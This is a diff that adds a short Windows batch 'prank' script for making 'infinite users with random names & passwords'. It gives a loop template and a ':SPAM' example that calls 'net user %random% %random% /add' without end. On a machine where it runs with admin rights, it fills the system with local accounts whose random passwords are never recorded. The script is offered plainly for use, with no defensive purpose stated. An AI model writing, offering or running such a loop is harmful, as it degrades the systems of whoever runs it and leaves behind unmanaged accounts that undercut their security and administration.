@@ -1,0 +1,21 @@
+Make infinite users with 
+random names & passwords:
+
+:(name of loop)
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+goto (name Of Loop)
+
+
+EXMAPLE:
+
+:SPAM
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+goto SPAM
